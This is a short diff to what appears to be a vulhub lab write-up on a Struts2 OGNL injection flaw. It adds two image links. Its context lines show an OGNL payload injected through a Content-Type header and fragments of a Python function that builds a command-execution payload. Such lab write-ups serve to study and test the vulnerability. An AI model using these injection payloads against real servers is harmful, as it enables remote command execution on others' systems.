@@ -5,6 +5,7 @@
 Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('vulhub',233*233)}.multipart/form-data
 
 ```
+![My Image](./image/1.png)
 
 ## 命令执行
 ```exp
@@ -28,3 +29,4 @@ def p(cmd):
     payload += "(#ros.flush())}"
 
 ```
+![My Image](./image/2.png)
